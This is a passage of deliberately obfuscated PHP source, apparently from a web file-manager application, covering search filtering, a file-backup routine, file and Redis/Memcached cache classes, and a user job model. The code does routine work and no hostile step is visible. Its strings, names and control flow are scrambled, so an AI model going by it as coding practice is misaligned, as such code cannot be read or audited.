(isset($Ê›ïö»È[$öÊÇõ²[2253]]) && $Ê›ïö»È[$öÊÇõ²[2253]] > $¤¤İ÷™å[$öÊÇõ²[79]]) { return !1; } if (isset($Ê›ïö»È[$öÊÇõ²[678]]) && $Ê›ïö»È[$öÊÇõ²[678]] != $¤¤İ÷™å[$öÊÇõ²[540]]) { return !1; } return !0; } public function listSearchChildren($Ò†¨‰·Ä, $åº¼öÎÜ = 5000) { $§É¹‹÷ß =& $_SERVER[äô®•½Â]; $ï©½Ö«° = array(); $å­ŠÖ„½ = $this->sourceInfo($Ò†¨‰·Ä); $ÅÉï—Œæ = array($§É¹‹÷ß[597] => array($§É¹‹÷ß[470], $å­ŠÖ„½[$§É¹‹÷ß[597]] . $å­ŠÖ„½[$§É¹‹÷ß[194]] . $§É¹‹÷ß[629])); $ÀõºëÇ = $this->field($§É¹‹÷ß[79])->where($ÅÉï—Œæ)->limit($åº¼öÎÜ + 1)->select(); $Ï³ü¬È– = is_array($ÀõºëÇ) ? count($ÀõºëÇ) : 0; if ($Ï³ü¬È– > $åº¼öÎÜ) { return $this->_listSearchChildrenNear($Ò†¨‰·Ä, $åº¼öÎÜ); } $ŸÃ„¤ÎÇ = $this->field($§É¹‹÷ß[194])->where($ÅÉï—Œæ)->select(); $ï©½Ö«° = array_to_keyvalue($ŸÃ„¤ÎÇ, $§É¹‹÷ß[12], $§É¹‹÷ß[194]); return $ï©½Ö«°; } private function _listSearchChildrenNear($ÊŠËùñß, $˜‡Öèæ») { $„ä‚ğã =& $_SERVER[äô®•½Â]; $´ºÍÙÒ· = array(); $Á½ïÚ = array($„ä‚ğã[193] => $ÊŠËùñß); $¸¡áÆ¥© = $this->field($„ä‚ğã[2254])->where($Á½ïÚ)->select(); $¦Âø¨œš = array_to_keyvalue(array_filter_by_field($¸¡áÆ¥©, $„ä‚ğã[496], $„ä‚ğã[91]), $„ä‚ğã[12], $„ä‚ğã[194]); $´ºÍÙÒ· = array_merge($´ºÍÙÒ·, array_to_keyvalue($¸¡áÆ¥©, $„ä‚ğã[12], $„ä‚ğã[194])); if (!$¦Âø¨œš) { return $´ºÍÙÒ·; } $Á½ïÚ = array($„ä‚ğã[193] => array($„ä‚ğã[7], $¦Âø¨œš)); $¸¡áÆ¥© = $this->field($„ä‚ğã[2254])->where($Á½ïÚ)->limit($˜‡Öèæ»)->select(); $´ºÍÙÒ· = array_merge($´ºÍÙÒ·, array_to_keyvalue($¸¡áÆ¥©, $„ä‚ğã[12], $„ä‚ğã[194])); $´ºÍÙÒ· = array_slice($´ºÍÙÒ·, 0, intval($˜‡Öèæ»)); return $´ºÍÙÒ·; } private function _listSearchBindPinyin($îÈûİ•÷, &$èÚöËÌ, &$â¿ì‚›) { $‚§ßĞÆ =& $_SERVER[äô®•½Â]; if (!isset($îÈûİ•÷[$‚§ßĞÆ[2076]]) || !$îÈûİ•÷[$‚§ßĞÆ[2076]]) { return; } if (!Input::check($îÈûİ•÷[$‚§ßĞÆ[2076]], $‚§ßĞÆ[404]) || strlen($îÈûİ•÷[$‚§ßĞÆ[2076]]) < 2) { return; } $êµ’˜Á = "\114\105\x46\x54\40\x4a\117\x49\x4e\40{$this->tablePrefix}\x69\x6f\x5f\163\x6f\165\x72\x63\x65\137\155\x65\164\x61\40\155\x65\x74\141\40\157\x6e\x20\163\x6f\165\x72\143\145\56\163\157\x75\162\x63\x65\111\x44\40\x3d\x20\155\145\164\141\x2e\x73\157\165\162\x63\x65\x49\104"; $Ì¼ÅÔÕÎ = array(); $â¿ì‚› = str_replace(array($‚§ßĞÆ[288], $‚§ßĞÆ[53], $‚§ßĞÆ[2255]), $‚§ßĞÆ[12], $â¿ì‚›); $â¿ì‚› = $‚§ßĞÆ[522] . str_replace($‚§ßĞÆ[50], $‚§ßĞÆ[523], $â¿ì‚›); $‹³ıîÕ‘ = $èÚöËÌ[$‚§ßĞÆ[32]]; unset($èÚöËÌ[$‚§ßĞÆ[32]]); foreach ($èÚöËÌ as $§ù‹°· => $ûûÑ ) { $Ì¼ÅÔÕÎ[$‚§ßĞÆ[522] . $§ù‹°·] = $ûûÑ ; } foreach ($‹³ıîÕ‘ as $å¹Æî¾¡) { $Ì¼ÅÔÕÎ[] = array($‚§ßĞÆ[527] => $å¹Æî¾¡, $‚§ßĞÆ[1072] => $‚§ßĞÆ[2080], array($‚§ßĞÆ[2256] => $å¹Æî¾¡, $‚§ßĞÆ[2257] => array($‚§ßĞÆ[7], array($‚§ßĞÆ[549], $‚§ßĞÆ[548])))); } $this->join($êµ’˜Á); $èÚöËÌ = $Ì¼ÅÔÕÎ; } private function _parseSearchWhere($Î« €–ı) { $™ÆÜˆµã =& $_SERVER[äô®•½Â]; $¶íß–÷¸ = array(); if (isset($Î« €–ı[$™ÆÜˆµã[826]]) && $Î« €–ı[$™ÆÜˆµã[826]]) { $¶íß–÷¸[$™ÆÜˆµã[88]] = array($™ÆÜˆµã[2258], $Î« €–ı[$™ÆÜˆµã[826]]); } if (isset($Î« €–ı[$™ÆÜˆµã[827]]) && $Î« €–ı[$™ÆÜˆµã[827]]) { $À€·¶ñİ = array($™ÆÜˆµã[2259], $Î« €–ı[$™ÆÜˆµã[827]]); if ($¶íß–÷¸[$™ÆÜˆµã[88]]) { $¶íß–÷¸[$™ÆÜˆµã[88]] = array($¶íß–÷¸[$™ÆÜˆµã[88]], $À€·¶ñİ, $™ÆÜˆµã[2260]); } else { $¶íß–÷¸[$™ÆÜˆµã[88]] = $À€·¶ñİ; } } if (isset($Î« €–ı[$™ÆÜˆµã[2252]]) && $Î« €–ı[$™ÆÜˆµã[2252]] > 0) { $¶íß–÷¸[$™ÆÜˆµã[79]] = array($™ÆÜˆµã[2258], $Î« €–ı[$™ÆÜˆµã[2252]]); } if (isset($Î« €–ı[$™ÆÜˆµã[2253]]) && $Î« €–ı[$™ÆÜˆµã[2253]]) { $À€·¶ñİ = array($™ÆÜˆµã[2259], $Î« €–ı[$™ÆÜˆµã[2253]]); if ($¶íß–÷¸[$™ÆÜˆµã[79]]) { $¶íß–÷¸[$™ÆÜˆµã[79]] = array($¶íß–÷¸[$™ÆÜˆµã[79]], $À€·¶ñİ, $™ÆÜˆµã[2260]); } else { $¶íß–÷¸[$™ÆÜˆµã[79]] = $À€·¶ñİ; } } if (isset($Î« €–ı[$™ÆÜˆµã[678]]) && $Î« €–ı[$™ÆÜˆµã[678]]) { $¶íß–÷¸[] = array($™ÆÜˆµã[540] => $Î« €–ı[$™ÆÜˆµã[678]], $™ÆÜˆµã[538] => $Î« €–ı[$™ÆÜˆµã[678]], $™ÆÜˆµã[1072] => $™ÆÜˆµã[2080]); } if (isset($Î« €–ı[$™ÆÜˆµã[497]]) && $Î« €–ı[$™ÆÜˆµã[497]]) { $ƒ½ö“ğÚ = $Î« €–ı[$™ÆÜˆµã[497]]; if ($ƒ½ö“ğÚ == $™ÆÜˆµã[78]) { $¶íß–÷¸[$™ÆÜˆµã[496]] = 1; } else { if ($ƒ½ö“ğÚ == $™ÆÜˆµã[2261]) { $¶íß–÷¸[$™ÆÜˆµã[496]] = 0; } else { if ($ƒ½ö“ğÚ) { $ƒ½ö“ğÚ = is_array($ƒ½ö“ğÚ) ? $ƒ½ö“ğÚ : explode($™ÆÜˆµã[50], $ƒ½ö“ğÚ); $¶íß–÷¸[$™ÆÜˆµã[497]] = array($™ÆÜˆµã[503], $ƒ½ö“ğÚ); $¶íß–÷¸[$™ÆÜˆµã[496]] = 0; } } } } $this->_parseSearchParent($Î« €–ı, $¶íß–÷¸); if (isset($Î« €–ı[$™ÆÜˆµã[2076]]) && trim($Î« €–ı[$™ÆÜˆµã[2076]])) { $ıÉãÖ³Æ = trim($Î« €–ı[$™ÆÜˆµã[2076]]); $òùà´í = explode($™ÆÜˆµã[53], $ıÉãÖ³Æ); if (strlen($ıÉãÖ³Æ) > 2 && (substr($ıÉãÖ³Æ, 0, 1) == $™ÆÜˆµã[121] && substr($ıÉãÖ³Æ, -1) == $™ÆÜˆµã[121]) || substr($ıÉãÖ³Æ, 0, 1) == $™ÆÜˆµã[58] && substr($ıÉãÖ³Æ, -1) == $™ÆÜˆµã[58]) { $ıÉãÖ³Æ = substr($ıÉãÖ³Æ, 1, -1); $òùà´í = array($ıÉãÖ³Æ); } $¶íß–÷¸[$™ÆÜˆµã[32]] = array(array($™ÆÜˆµã[628], $™ÆÜˆµã[2078] . $ıÉãÖ³Æ . $™ÆÜˆµã[2078])); if (count($òùà´í) > 1) { $¶íß–÷¸[$™ÆÜˆµã[32]] = array(); foreach ($òùà´í as $…¨£ªô) { if (!trim($…¨£ªô)) { continue; } $¶íß–÷¸[$™ÆÜˆµã[32]][] = array($™ÆÜˆµã[628], $™ÆÜˆµã[2078] . trim($…¨£ªô) . $™ÆÜˆµã[2078]); } } } return $¶íß–÷¸; } private function _parseSearchParent($ÂÌ›¡ğ¡, &$…´•ŸÔğ) { $“ŒÅ»Â“ =& $_SERVER[äô®•½Â]; if (!isset($ÂÌ›¡ğ¡[$“ŒÅ»Â“[193]]) || !$ÂÌ›¡ğ¡[$“ŒÅ»Â“[193]]) { return; } $èªëíÚğ = $this->pathInfo($ÂÌ›¡ğ¡[$“ŒÅ»Â“[193]]); $‹Æ—ŒÛ = $èªëíÚğ[$“ŒÅ»Â“[193]] . $“ŒÅ»Â“[12] === $“ŒÅ»Â“[231]; $¦ëå“‚ = $èªëíÚğ[$“ŒÅ»Â“[191]] == $“ŒÅ»Â“[591]; if ($èªëíÚğ[$“ŒÅ»Â“[607]] == $“ŒÅ»Â“[608]) { $ÄĞğë²‡ = $this->sourceInfo($ÂÌ›¡ğ¡[$“ŒÅ»Â“[193]]); $èªëíÚğ[$“ŒÅ»Â“[597]] = $ÄĞğë²‡[$“ŒÅ»Â“[597]]; } $…´•ŸÔğ[$“ŒÅ»Â“[668]] = array($“ŒÅ»Â“[628], $èªëíÚğ[$“ŒÅ»Â“[597]] . $ÂÌ›¡ğ¡[$“ŒÅ»Â“[193]] . $“ŒÅ»Â“[629]); $å¹Ò¾ñ = isset($ÂÌ›¡ğ¡[$“ŒÅ»Â“[1937]]) && in_array($“ŒÅ»Â“[591], $ÂÌ›¡ğ¡[$“ŒÅ»Â“[1937]]); if (!$å¹Ò¾ñ || !$¦ëå“‚ || !$‹Æ—ŒÛ || !$èªëíÚğ[$“ŒÅ»Â“[498]]) { return; } if (!AuthModel::authCheckRoot($èªëíÚğ[$“ŒÅ»Â“[498]][$“ŒÅ»Â“[499]])) { return; } $³—¤ ª÷ = $èªëíÚğ[$“ŒÅ»Â“[582]] . $“ŒÅ»Â“[12]; if ($³—¤ ª÷ == $“ŒÅ»Â“[91]) { unset($…´•ŸÔğ[$“ŒÅ»Â“[668]]); $…´•ŸÔğ[$“ŒÅ»Â“[191]] = self::TYPE_GROUP; return; } $´õ‰•¡Œ = Model($“ŒÅ»Â“[598])->groupChildrenAll($³—¤ ª÷); $åÙé×ãñ = count($´õ‰•¡Œ); if ($åÙé×ãñ <= 1) { return; } $½È¯ú»ı = array($“ŒÅ»Â“[193] => 0, $“ŒÅ»Â“[191] => self::TYPE_GROUP, $“ŒÅ»Â“[582] => array($“ŒÅ»Â“[7], $´õ‰•¡Œ)); $„üÀËİÅ = $this->field($“ŒÅ»Â“[2262])->where($½È¯ú»ı)->limit($åÙé×ãñ)->select(); $…´•ŸÔğ[$“ŒÅ»Â“[668]] = array(); foreach ($„üÀËİÅ as $°ôÅ¶) { $…´•ŸÔğ[$“ŒÅ»Â“[668]][] = array($“ŒÅ»Â“[628], $“ŒÅ»Â“[606] . $°ôÅ¶[$“ŒÅ»Â“[194]] . $“ŒÅ»Â“[629]); } $…´•ŸÔğ[$“ŒÅ»Â“[668]][] = $“ŒÅ»Â“[2080]; } } goto E ¸Œ¹¾¸Ò; bÓõ¬ò¨±: class BackupFile { public function __construct() { } public function index() { $šüÃÎ‰¸ = Backup::get(); $·ã¥¾Î = $šüÃÎ‰¸[$_SERVER[äô®•½Â][821]][$_SERVER[äô®•½Â][233]][$_SERVER[äô®•½Â][554]]; $œ¸áÃË = array($_SERVER[äô®•½Â][555] => array($_SERVER[äô®•½Â][878], $·ã¥¾Î), $_SERVER[äô®•½Â][879] => array($_SERVER[äô®•½Â][417], $šüÃÎ‰¸[$_SERVER[äô®•½Â][817]])); $ƒ…¶ê€ö = (int) Model($_SERVER[äô®•½Â][857])->where($œ¸áÃË)->count($_SERVER[äô®•½Â][554]); $ÁÌ»¿¾Ã = (int) Model($_SERVER[äô®•½Â][857])->where($œ¸áÃË)->sum($_SERVER[äô®•½Â][79]); $‡´†ĞÕ = new TaskFileTransfer($_SERVER[äô®•½Â][880], $_SERVER[äô®•½Â][843], $ƒ…¶ê€ö, LNG($_SERVER[äô®•½Â][852]) . $_SERVER[äô®•½Â][853] . LNG($_SERVER[äô®•½Â][881])); $‡´†ĞÕ->task[$_SERVER[äô®•½Â][829]] = $ÁÌ»¿¾Ã; $‚¬Š¢ªÚ = array($_SERVER[äô®•½Â][882] => $ƒ…¶ê€ö, $_SERVER[äô®•½Â][883] => $ÁÌ»¿¾Ã, $_SERVER[äô®•½Â][884] => time()); Backup::set($‚¬Š¢ªÚ); $ŒÌîãø = !0; $ò§®¶¢Ş = $this->storeIds(); $³úàŞƒ¿ = 1; $³ ½ÂÈ• = 1000; $¤¿·«Ü = $Ö’ŠÌÚ¸ = 0; $«³¤µ© = array(); $¹õîÄ»¸ = $»ª²ïÒ = 0; do { $Ü·®º©Â = $_SERVER[äô®•½Â][885]; $ïÓÍ¹¦’ = Model($_SERVER[äô®•½Â][857])->where($œ¸áÃË)->field($Ü·®º©Â)->order($_SERVER[äô®•½Â][886])->selectPage($³ ½ÂÈ•, $³úàŞƒ¿); $ô¶§Ö‹ = !empty($ïÓÍ¹¦’[$_SERVER[äô®•½Â][456]]) ? $ïÓÍ¹¦’[$_SERVER[äô®•½Â][456]] : array(); foreach ($ô¶§Ö‹ as $ÒãçÊÀ¾) { if (!$this->_fileExist($ÒãçÊÀ¾, $«³¤µ©, $ò§®¶¢Ş)) { Backup::log($_SERVER[äô®•½Â][887] . $ÒãçÊÀ¾[$_SERVER[äô®•½Â][554]] . $_SERVER[äô®•½Â][888] . $ÒãçÊÀ¾[$_SERVER[äô®•½Â][87]]); continue; } $ê¤…™Âğ = $ÒãçÊÀ¾[$_SERVER[äô®•½Â][87]]; $ù»ô‚† = "\173\x69\x6f\x3a{$šüÃÎ‰¸[$_SERVER[äô®•½Â][817]]}\x7d" . substr($ê¤…™Âğ, strlen("\x7b\x69\157\x3a{$ÒãçÊÀ¾[$_SERVER[äô®•½Â][889]]}\175")); if (IO::exist($ù»ô‚†)) { $‡´†ĞÕ->updateFileEnd($ÒãçÊÀ¾[$_SERVER[äô®•½Â][32]], $ÒãçÊÀ¾[$_SERVER[äô®•½Â][79]]); } else { $ù»ô‚† = get_path_father($ù»ô‚†); IO::mkdir($ù»ô‚†); if (!IO::copy($ê¤…™Âğ, $ù»ô‚†, $_SERVER[äô®•½Â][890])) { Backup::log($_SERVER[äô®•½Â][891] . $ê¤…™Âğ . $_SERVER[äô®•½Â][873] . $ù»ô‚† . $_SERVER[äô®•½Â][178]); $ŒÌîãø = !1; break; } } $·ã¥¾Î = $ÒãçÊÀ¾[$_SERVER[äô®•½Â][554]]; $Ö’ŠÌÚ¸ += 1; $¤¿·«Ü += $ÒãçÊÀ¾[$_SERVER[äô®•½Â][79]]; $»ª²ïÒ += 1; $¹õîÄ»¸ += $ÒãçÊÀ¾[$_SERVER[äô®•½Â][79]]; if ($¤¿·«Ü >= 1024 * 1024 * 100) { $‚¬Š¢ªÚ = array($_SERVER[äô®•½Â][816] => $·ã¥¾Î, $_SERVER[äô®•½Â][892] => $»ª²ïÒ, $_SERVER[äô®•½Â][893] => $¹õîÄ»¸); Backup::set($‚¬Š¢ªÚ); $¤¿·«Ü = $Ö’ŠÌÚ¸ = 0; } } $û¯ÜÅÕø = count($ô¶§Ö‹); $³úàŞƒ¿++; } while ($û¯ÜÅÕø == $³ ½ÂÈ•); $‡´†ĞÕ->end(); $‚¬Š¢ªÚ = array($_SERVER[äô®•½Â][894] => 1, $_SERVER[äô®•½Â][827] => time(), $_SERVER[äô®•½Â][841] => 1, $_SERVER[äô®•½Â][816] => $·ã¥¾Î, $_SERVER[äô®•½Â][895] => time()); if ($Ö’ŠÌÚ¸) { $‚¬Š¢ªÚ[$_SERVER[äô®•½Â][892]] = $»ª²ïÒ; $‚¬Š¢ªÚ[$_SERVER[äô®•½Â][893]] = $¹õîÄ»¸; } Backup::set($‚¬Š¢ªÚ); return !0; } private function _fileExist($«ûÛìØƒ, &$ÆÇ¥Ê¥, $Å‹€´à) { $öù‰ëşÁ =& $_SERVER[äô®•½Â]; $ÊˆéÔ = $«ûÛìØƒ[$öù‰ëşÁ[87]]; if (in_array($«ûÛìØƒ[$öù‰ëşÁ[554]], $ÆÇ¥Ê¥)) { return !1; } if (!in_array($«ûÛìØƒ[$öù‰ëşÁ[889]], $Å‹€´à)) { return !1; } if (IO::exist($ÊˆéÔ)) { return !0; } $ÓÀ­ı×½ = get_path_father($ÊˆéÔ); if (IO::exist($ÓÀ­ı×½)) { $ÆÇ¥Ê¥[] = $«ûÛìØƒ[$öù‰ëşÁ[554]]; return !1; } $êÁ¤ì¢¡ = array($öù‰ëşÁ[889] => $«ûÛìØƒ[$öù‰ëşÁ[889]], $öù‰ëşÁ[87] => array($öù‰ëşÁ[470], "{$ÓÀ­ı×½}\x25")); $ ºĞ´ïÔ = Model($öù‰ëşÁ[857])->where($êÁ¤ì¢¡)->field($öù‰ëşÁ[555])->select(); $ÆÇ¥Ê¥ = array_merge($ÆÇ¥Ê¥, array_to_keyvalue($ ºĞ´ïÔ, $öù‰ëşÁ[12], $öù‰ëşÁ[554])); return !1; } private function _fileFilter($ñ‰¯ÖÚÔ) { $­Ø“’¢© =& $_SERVER[äô®•½Â]; return; if (empty($ñ‰¯ÖÚÔ)) { return; } $ñ£¼„ã€ = array($­Ø“’¢©[554] => array($­Ø“’¢©[7], array_unique($ñ‰¯ÖÚÔ))); $±ãö³´· = Model($­Ø“’¢©[896])->where($ñ£¼„ã€)->field($­Ø“’¢©[194])->select(); foreach ($±ãö³´· as $Í—âÖ¼Â) { Model($­Ø“’¢©[896])->remove($Í—âÖ¼Â[$­Ø“’¢©[194]], !1); } } private function storeIds() { $éİ…å²ó =& $_SERVER[äô®•½Â]; $ğåßğ€ = Model($éİ…å²ó[833])->listData(); $ğÅïµ æ = array(); $ŞŸÁÂœá = $GLOBALS[$éİ…å²ó[6]][$éİ…å²ó[92]][$éİ…å²ó[897]]; foreach ($ğåßğ€ as $Ö€»Öª) { $Ÿû¡üŒ™ = strtolower($Ö€»Öª[$éİ…å²ó[98]]); if (!isset($ŞŸÁÂœá[$Ÿû¡üŒ™])) { continue; } $õ“Œ‚¿ = $éİ…å²ó[77] . (isset($ŞŸÁÂœá[$Ÿû¡üŒ™]) ? $ŞŸÁÂœá[$Ÿû¡üŒ™] : ucfirst($Ÿû¡üŒ™)); if (!class_exists($õ“Œ‚¿)) { continue; } $ğÅïµ æ[] = $Ö€»Öª[$éİ…å²ó[486]]; } return $ğÅïµ æ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Š ˜ó·  =& $_SERVER[äô®•½Â]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $€Ö®à÷İ = $GLOBALS[$Š ˜ó· [6]][$Š ˜ó· [435]]; $ÑÍ˜Ô§È = $€Ö®à÷İ[$€Ö®à÷İ[$Š ˜ó· [898]]]; $½™ášàê = $€Ö®à÷İ[$Š ˜ó· [899]]; switch ($€Ö®à÷İ[$Š ˜ó· [898]]) { case $Š ˜ó· [21]: self::$handle = Model($Š ˜ó· [900]); break; case $Š ˜ó· [901]: self::$handle = new CacheRedis($ÑÍ˜Ô§È, $½™ášàê); break; case $Š ˜ó· [902]: self::$handle = new CacheMemcached($ÑÍ˜Ô§È, $½™ášàê); break; case $Š ˜ó· [233]: self::$handle = new CacheFile($ÑÍ˜Ô§È, $½™ášàê); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($¿¢êõÌÔ) { if (is_array($¿¢êõÌÔ) || is_object($¿¢êõÌÔ)) { $¿¢êõÌÔ = json_encode($¿¢êõÌÔ); } $¿¢êõÌÔ = rawurlencode($¿¢êõÌÔ); return md5(KOD_SITE_ID . $_SERVER[äô®•½Â][11] . $¿¢êõÌÔ); } public static function get($›³°ÌÂÕ, $‰“ö§şà = false) { $ıñ„ˆÙó = self::key($›³°ÌÂÕ); $À¤¯Ö½ˆ = self::init(); if ($‰“ö§şà) { return unserialize($À¤¯Ö½ˆ->get($ıñ„ˆÙó)); } if (!isset(self::$memoryCache[$ıñ„ˆÙó])) { $Î­¬Õâ˜ = $À¤¯Ö½ˆ->get($ıñ„ˆÙó); self::$memoryCache[$ıñ„ˆÙó] = unserialize($Î­¬Õâ˜); } return self::$memoryCache[$ıñ„ˆÙó]; } public static function set($’Éí™Š¡, $ŞãÉ„°, $¬ôˆØ“” = false) { $„ş¥½Ä½ =& $_SERVER[äô®•½Â]; $šÂĞ¥°ñ = self::key($’Éí™Š¡); if (isset(self::$memoryCache[$šÂĞ¥°ñ]) && self::$memoryCache[$šÂĞ¥°ñ] === $ŞãÉ„°) { return !0; } if ($¬ôˆØ“” === 0) { self::$memoryCache[$šÂĞ¥°ñ] = $ŞãÉ„°; return !0; } $ÁŞµÜŒ… = self::init(); $ùÀİëÉÀ = serialize($ŞãÉ„°); CacheLock::lock($’Éí™Š¡ . $„ş¥½Ä½[903]); $ÌÇ…Åªå = $ÁŞµÜŒ…->set($šÂĞ¥°ñ, $ùÀİëÉÀ, $¬ôˆØ“”); self::$memoryCache[$šÂĞ¥°ñ] = $ŞãÉ„°; CacheLock::unlock($’Éí™Š¡ . $„ş¥½Ä½[903]); return $ÌÇ…Åªå; } public static function getCall($ñÒ‚¥ìô, $ËÉ‘ˆòò, $ê½Ãª, $åîæ±¼ò = array()) { $‡ı§€ÅÃ =& $_SERVER[äô®•½Â]; $…Ï´Úß = self::get($ñÒ‚¥ìô); if ($…Ï´Úß || $…Ï´Úß === $‡ı§€ÅÃ[12]) { return $…Ï´Úß; } $…Ï´Úß = call_user_func_array($ê½Ãª, $åîæ±¼ò); $…Ï´Úß = $…Ï´Úß ? $…Ï´Úß : $‡ı§€ÅÃ[12]; self::set($ñÒ‚¥ìô, $…Ï´Úß, $ËÉ‘ˆòò); return $…Ï´Úß; } public static function remove($›¿£ñÔ) { $²Ô×õá£ = self::key($›¿£ñÔ); unset(self::$memoryCache[$²Ô×õá£]); self::clearTimeout(); CacheLock::lock($›¿£ñÔ); $“¸óŒ‹² = self::init()->remove($²Ô×õá£); CacheLock::unlock($›¿£ñÔ); return $“¸óŒ‹²; } public static function removeMemory($ïğÆ”¡Ø) { $ú§¹Ïß‚ = self::key($ïğÆ”¡Ø); unset(self::$memoryCache[$ú§¹Ïß‚]); } public static function clearMemory($Á®Ìúİ = false) { if ($Á®Ìúİ) { $Á®Ìúİ = self::key($Á®Ìúİ); unset(self::$memoryCache[$Á®Ìúİ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[äô®•½Â][904])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[äô®•½Â][905])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($âµñí, $üÙÇ˜) { $ŸÜµæëä =& $_SERVER[äô®•½Â]; $this->cachePath = $âµñí[$ŸÜµæëä[87]]; $this->prefix = $ŸÜµæëä[906]; $this->cacheTime = $üÙÇ˜; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($šéèÁ“à) { $¯‰ç¢® =& $_SERVER[äô®•½Â]; $šéèÁ“à = str_replace(array($¯‰ç¢®[907], $¯‰ç¢®[100], $¯‰ç¢®[76]), $¯‰ç¢®[908], $šéèÁ“à); return $this->cachePath . $¯‰ç¢®[909] . $šéèÁ“à . $¯‰ç¢®[910]; } public function set($Í‰¼™ñè, $òüŒ»¥, $ºá¡¯± = false) { $ºá¡¯± = $ºá¡¯± ? $ºá¡¯± : $this->cacheTime; $ß†¯¨¹µ = $this->getFile($Í‰¼™ñè); if (file_put_contents($ß†¯¨¹µ, $this->prefix . $òüŒ»¥, LOCK_EX)) { @touch($ß†¯¨¹µ, intval(time() + $ºá¡¯±)); clearstatcache(); return !0; } @unlink($ß†¯¨¹µ); return !1; } public function get($‹±†›½ù) { $¡Éê£Ú = $this->getFile($‹±†›½ù); if (file_exists($¡Éê£Ú) && filemtime($¡Éê£Ú) < time()) { @unlink($¡Éê£Ú); return !1; } $ÉÓğûÅ = @file_get_contents($¡Éê£Ú); return substr($ÉÓğûÅ, strlen($this->prefix)); } public function remove($ÇØ·ö©Ô) { $Çéò’ïè = $this->getFile($ÇØ·ö©Ô); return @unlink($Çéò’ïè); } public function deleteAll() { $²÷–ŒÛä =& $_SERVER[äô®•½Â]; $¸©Âıåå = scandir($this->cachePath); foreach ($¸©Âıåå as $Ìğ›Š‡”) { $ì±ÊËÖ = $this->cachePath . $Ìğ›Š‡”; if (strpos($ì±ÊËÖ, $²÷–ŒÛä[910]) && strpos($ì±ÊËÖ, $²÷–ŒÛä[911])) { @unlink($ì±ÊËÖ); } } } public function clearTimeout() { $úÃ¿Ş·ö =& $_SERVER[äô®•½Â]; $ƒÖâ¬ƒ = scandir($this->cachePath); foreach ($ƒÖâ¬ƒ as $¨Ñ‚­ËÑ) { $¬©‚Í = $this->cachePath . $¨Ñ‚­ËÑ; if (strpos($¬©‚Í, $úÃ¿Ş·ö[910]) && strpos($¬©‚Í, $úÃ¿Ş·ö[911]) && filemtime($¬©‚Í) < time()) { @unlink($¬©‚Í); } } } } goto b‹–‚ö‰Ü¦; aÑ»Ä™§ˆë: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\152\x6f\142\x4c\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\x64\x65\x73\143", "\x73\x6f\162\x74"); const JOB_KEY = "\163\x65\x6c\146\112\157\142\114\151\163\x74"; public function listData($•Ê¾µ  = false, $ĞÈô‘²Í = "\163\157\x72\x74", $Îø—®Úñ = false) { return parent::listData($•Ê¾µ , $ĞÈô‘²Í, $Îø—®Úñ); } public function remove($Çø¥ª¶Ñ) { return parent::remove($Çø¥ª¶Ñ); } public function add($¨­„èú) { $Ç¦Ñè =& $_SERVER[äô®•½Â]; if ($this->findByName($¨­„èú[$Ç¦Ñè[32]])) { return !1; } $¨­„èú[$Ç¦Ñè[2001]] = $this->getSort(); return parent::insert($¨­„èú); } private function getSort() { $áÅÙ¦ùÓ =& $_SERVER[äô®•½Â]; $¥´èàÕ = parent::listData(); $ü¿˜Ñ‘© = array_to_keyvalue($¥´èàÕ, $áÅÙ¦ùÓ[12], $áÅÙ¦ùÓ[2001]); return empty($ü¿˜Ñ‘©) ? 0 : max($ü¿˜Ñ‘©) + 1; } public function update($Ç‚Ô³º, $Íá‹ÓŸ§) { $šïÒí™ =& $_SERVER[äô®•½Â]; $²¤šÂê = parent::listData($Ç‚Ô³º); $Ûò¤ß‡Î = $this->findByName($Íá‹ÓŸ§[$šïÒí™[32]]); if (!$²¤šÂê || $Ûò¤ß‡Î && $Ûò¤ß‡Î[$šïÒí™[486]] != $²¤šÂê[$šïÒí™[486]]) { return !1; } return parent::update($Ç‚Ô³º, $Íá‹ÓŸ§); } public function setUserJob($ç†Îğ‰¤, $§éêĞ±Ç) { $–¸Ó¤ŸŠ =& $_SERVER[äô®•½Â]; if (!is_array($§éêĞ±Ç)) { $§éêĞ±Ç = array($§éêĞ±Ç); } $ï½£º’† = parent::listData(); $Ì™’µüı = array_to_keyvalue($ï½£º’†, $–¸Ó¤ŸŠ[32]); $¦€ù¦Í¥ = $–¸Ó¤ŸŠ[465]; foreach ($§éêĞ±Ç as $¥ÁÖñ±£) { if ($Ì™’µüı[$¥ÁÖñ±£]) { $¦€ù¦Í¥ .= $Ì™’µüı[$¥ÁÖñ±£][$–¸Ó¤ŸŠ[486]] . $–¸Ó¤ŸŠ[50]; } else { $Ù’‰¹áı = $this->add($¥ÁÖñ±£); $¦€ù¦Í¥ .= $Ù’‰¹áı . $–¸Ó¤ŸŠ[50]; } } $¦€ù¦Í¥ = rtrim($¦€ù¦Í¥, $–¸Ó¤ŸŠ[50]); Model($–¸Ó¤ŸŠ[610])->metaSet($ç†Îğ‰¤, self::JOB_KEY, $¦€ù¦Í¥); } public function getUserJob($¯ìÊ÷Ì¿) { $È£ÊÊÔù = Model($_SERVER[äô®•½Â][610])->metaGet($¯ìÊ÷Ì¿); return $this->getUserJobInfo($È£ÊÊÔù[self::JOB_KEY]); } public function getUserJobInfo($ûØ»†ì‰) { $¹™ÕÒ¿ò =& $_SERVER[äô®•½Â]; $Ğ­äù„® = explode($¹™ÕÒ¿ò[50], $ûØ»†ì‰); $¼ˆÏÚÁ¼ = parent::listData(); $¼ˆÏÚÁ¼ = array_remove_key($¼ˆÏÚÁ¼, $¹™ÕÒ¿ò[234]); $Ë®øçËå = array(); foreach ($Ğ­äù„® as $§ú«¢¼Á) { if (isset($¼ˆÏÚÁ¼[$§ú«¢¼Á])) { $Ë®øçËå[] = $¼ˆÏÚÁ¼[$§ú«¢¼Á]; } } return $Ë®øçËå; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = 